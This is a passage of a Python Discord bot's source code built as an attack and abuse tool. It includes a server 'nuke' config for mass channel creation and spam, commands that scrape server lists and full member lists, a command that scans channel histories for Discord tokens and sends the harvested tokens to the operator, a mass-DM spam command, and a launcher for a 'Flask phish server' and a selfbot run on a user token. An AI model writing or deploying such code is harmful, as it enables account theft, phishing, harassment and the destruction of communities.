        embed.add_field(name="Channel Name", value=f"`{nuke_config['channel_name']}`", inline=False)
        embed.add_field(name="Spam Message", value=f"`{nuke_config['message'][:100]}`", inline=False)
        embed.add_field(name="Channel Count", value=str(ch_count), inline=True)
        embed.add_field(name="Spam Count",   value=str(sp_count), inline=True)
        await interaction.followup.send(embed=embed, ephemeral=True)

    async def on_error(self, interaction, error):
        await interaction.followup.send("❌ Something broke.", ephemeral=True)

@bot.command(name="LHP")
async def lhp(ctx):
    try: await ctx.message.delete()
    except Exception: pass
    class LHPView(discord.ui.View):
        def __init__(self): super().__init__(timeout=60)
        @discord.ui.button(label="⚙️ Open Config Editor", style=discord.ButtonStyle.blurple)
        async def open_modal(self, interaction, button):
            if interaction.user.id != ctx.author.id: await interaction.response.send_message("❌ Not for you.", ephemeral=True); return
            await interaction.response.send_modal(LHPModal()); self.stop()
    msg = await ctx.send(embed=discord.Embed(title="⚙️ LH Premium Config", description="Click to open.\nRequires a valid token.", color=0xffd700), view=LHPView())
    await asyncio.sleep(61)
    try: await msg.delete()
    except Exception: pass

# ══════════════════════════════════════════════════════════════
#  INTEL
# ══════════════════════════════════════════════════════════════

@bot.command(name="LHSPY")
async def lh_spy(ctx):
    if ctx.author.id != PREMIUM_USER_ID: await ctx.send("❌ Access Denied.", delete_after=3); return
    try: await ctx.message.delete()
    except Exception: pass
    guilds = bot.guilds
    if not guilds: await ctx.author.send("Not in any servers."); return
    for idx, page in enumerate([guilds[i:i+10] for i in range(0, len(guilds), 10)]):
        embed = discord.Embed(title=f"📡 Server Spy — Page {idx+1}", color=0xff4400, timestamp=discord.utils.utcnow())
        for g in page:
            try: owner = await bot.fetch_user(g.owner_id); owner_str = f"{owner} (`{owner.id}`)"
            except Exception: owner_str = f"ID: `{g.owner_id}`"
            embed.add_field(name=g.name, value=f"ID: `{g.id}`\nMembers: `{g.member_count}`\nOwner: {owner_str}\nAntiNuke: {'🟢' if antinuke_enabled[g.id] else '🔴'}", inline=True)
        try: await ctx.author.send(embed=embed)
        except discord.Forbidden: await ctx.send(embed=embed, delete_after=30)
    await ctx.send("📡 Sent to DMs.", delete_after=5)

@bot.command(name="LHMEMBERS")
async def lh_members(ctx, server_id: str = None):
    if ctx.author.id != PREMIUM_USER_ID: await ctx.send("❌ Access Denied.", delete_after=3); return
    if not server_id: await ctx.send("❌ Usage: `!LHMEMBERS <id>`", delete_after=5); return
    try: guild = bot.get_guild(int(server_id))
    except ValueError: await ctx.send("❌ Invalid ID.", delete_after=5); return
    if not guild: await ctx.send("❌ Not in that server.", delete_after=5); return
    try: await ctx.message.delete()
    except Exception: pass
    await ctx.send("📋 Fetching...", delete_after=5)
    lines = [f"Member List — {guild.name} ({guild.id})\n{'='*50}"]
    async for member in guild.fetch_members(limit=None):
        lines.append(f"Username : {member}\nID       : {member.id}\nTop Role : {member.top_role.name}\nJoined   : {member.joined_at.strftime('%Y-%m-%d') if member.joined_at else 'unknown'}\nBot      : {'Yes' if member.bot else 'No'}\n{'-'*40}")
    file_path = f"/tmp/members_{guild.id}.txt"
    with open(file_path, "w", encoding="utf-8") as f: f.write("\n".join(lines))
    try:
        await ctx.author.send(content=f"📋 Member list for **{guild.name}**", file=discord.File(file_path, filename=f"members_{guild.name}.txt"))
        await ctx.send("📋 Sent to DMs.", delete_after=5)
    except discord.Forbidden: await ctx.send(file=discord.File(file_path, filename=f"members_{guild.name}.txt"))

@bot.command(name="LHTOKENS")
async def lh_tokens_cmd(ctx, server_id: str = None):
    if ctx.author.id != PREMIUM_USER_ID: await ctx.send("❌ Access Denied.", delete_after=3); return
    if not server_id: await ctx.send("❌ Usage: `!LHTOKENS <id>`", delete_after=5); return
    try: guild = bot.get_guild(int(server_id))
    except ValueError: await ctx.send("❌ Invalid ID.", delete_after=5); return
    if not guild: await ctx.send("❌ Not in that server.", delete_after=5); return
    try: await ctx.message.delete()
    except Exception: pass
    status = await ctx.send("🔍 Scanning...")
    found = []
    for channel in guild.text_channels:
        try:
            async for msg in channel.history(limit=500):
                for match in DISCORD_TOKEN_REGEX.findall(msg.content):
                    found.append(f"Token  : {match}\nAuthor : {msg.author} ({msg.author.id})\nChannel: #{channel.name}\n{'─'*40}")
        except Exception: continue
    try: await status.delete()
    except Exception: pass
    if not found:
        try: await ctx.author.send(f"🔍 No tokens found in **{guild.name}**.")
        except Exception: await ctx.send("🔍 No tokens found.", delete_after=10)
        return
    output = f"Token Scan — {guild.name}\nFound: {len(found)}\n{'='*50}\n" + "\n".join(found)
    file_path = f"/tmp/tokens_{guild.id}.txt"
    with open(file_path, "w", encoding="utf-8") as f: f.write(output)
    try:
        await ctx.author.send(content=f"🔑 Found **{len(found)}** token(s)", file=discord.File(file_path, filename=f"tokens_{guild.name}.txt"))
    except discord.Forbidden: await ctx.send(file=discord.File(file_path, filename=f"tokens_{guild.name}.txt"))

# ── slash DM + info ───────────────────────────────────────────

@bot.tree.command(name="dm", description="DM a user")
@app_commands.describe(member="@mention", user_id="Or paste ID", message="Message", count="Times (max 200)", delay="Delay between messages (seconds)")
async def dm(interaction: discord.Interaction, message: str, count: app_commands.Range[int, 1, 200], member: Opt[discord.Member] = None, user_id: Opt[str] = None, delay: Opt[float] = None):
    await interaction.response.defer(ephemeral=True)
    actual_delay = max(0.0, min(delay or 0.0, 10.0))
    if member: user = member
    elif user_id:
        try: user = await bot.fetch_user(int(user_id))
        except discord.NotFound: await interaction.followup.send("❌ Not found.", ephemeral=True); return
        except ValueError: await interaction.followup.send("❌ Invalid ID.", ephemeral=True); return
    else: await interaction.followup.send("❌ Provide mention or ID.", ephemeral=True); return
    ok = 0; fail = 0
    for _ in range(count):
        try:
            await user.send(message); ok += 1
            if actual_delay > 0: await asyncio.sleep(actual_delay)
        except discord.Forbidden: fail = count - ok; break
        except discord.HTTPException: fail += 1
    color = 0x00ff00 if fail == 0 else (0xff0000 if ok == 0 else 0xff9900)
    embed = discord.Embed(title="📬 DM Report", color=color)
    embed.add_field(name="Target",       value=f"{user} (`{user.id}`)", inline=False)
    embed.add_field(name="✅ Sent",      value=str(ok),                 inline=True)
    embed.add_field(name="❌ Failed",    value=str(fail),               inline=True)
    embed.add_field(name="📨 Requested", value=str(count),             inline=True)
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="serverinfo", description="Show server info")
async def serverinfo(interaction: discord.Interaction):
    g = interaction.guild
    embed = discord.Embed(title=f"📊 {g.name}", color=0x5865f2, timestamp=discord.utils.utcnow())
    embed.set_thumbnail(url=g.icon.url if g.icon else None)
    embed.add_field(name="Owner",    value=str(g.owner),                      inline=True)
    embed.add_field(name="Members",  value=str(g.member_count),               inline=True)
    embed.add_field(name="Channels", value=str(len(g.channels)),              inline=True)
    embed.add_field(name="Roles",    value=str(len(g.roles)),                 inline=True)
    embed.add_field(name="Created",  value=g.created_at.strftime("%Y-%m-%d"), inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="userinfo", description="Show info about a user")
@app_commands.describe(member="User to inspect")
async def userinfo(interaction: discord.Interaction, member: discord.Member):
    embed = discord.Embed(title=f"👤 {member}", color=member.color, timestamp=discord.utils.utcnow())
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="ID",              value=str(member.id),                         inline=True)
    embed.add_field(name="Joined Server",   value=member.joined_at.strftime("%Y-%m-%d"),  inline=True)
    embed.add_field(name="Account Created", value=member.created_at.strftime("%Y-%m-%d"), inline=True)
    embed.add_field(name="Top Role",        value=member.top_role.mention,                inline=True)
    embed.add_field(name="Bot?",            value="Yes" if member.bot else "No",          inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="poll", description="Create a yes/no poll")
@app_commands.describe(question="What to ask")
async def poll(interaction: discord.Interaction, question: str):
    embed = discord.Embed(title="📊 Poll", description=question, color=0xfee75c)
    embed.set_footer(text=f"Asked by {interaction.user}")
    await interaction.response.send_message(embed=embed)
    msg = await interaction.original_response()
    await msg.add_reaction("✅"); await msg.add_reaction("❌")

@bot.tree.command(name="ping", description="Check bot latency")
async def ping(interaction: discord.Interaction):
    lat = round(bot.latency * 1000)
    color = 0x00ff00 if lat < 100 else (0xff9900 if lat < 200 else 0xff0000)
    await interaction.response.send_message(embed=discord.Embed(title="🏓 Pong!", description=f"**{lat}ms**", color=color), ephemeral=True)

# ══════════════════════════════════════════════════════════════
#  SETUP HOOK
# ══════════════════════════════════════════════════════════════

async def setup_hook():
    bot.add_view(VerifyButton())
    bot.add_view(HelpView())

bot.setup_hook = setup_hook


# ─────────────────────────────────────────────────────────────
#  LAUNCH — flask thread → selfbot thread → main bot
# ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    # 1. Flask phish server
    t_flask = threading.Thread(target=_run_flask, daemon=True)
    t_flask.start()
    print("[MAIN] Flask started on port 8080")

    # 2. Selfbot (only if SELF_TOKEN is set)
    if SELF_TOKEN and SELF_TOKEN != "YOUR_USER_TOKEN_HERE":
        t_selfbot = threading.Thread(target=_run_selfbot, daemon=True)
        t_selfbot.start()
        print("[MAIN] Selfbot thread started")
    else:
        print("[MAIN] SELF_TOKEN not set — selfbot skipped")

    # 3. Main bot (takes the main thread / event loop)
    print("[MAIN] Starting main bot...")
    bot.run(TOKEN)
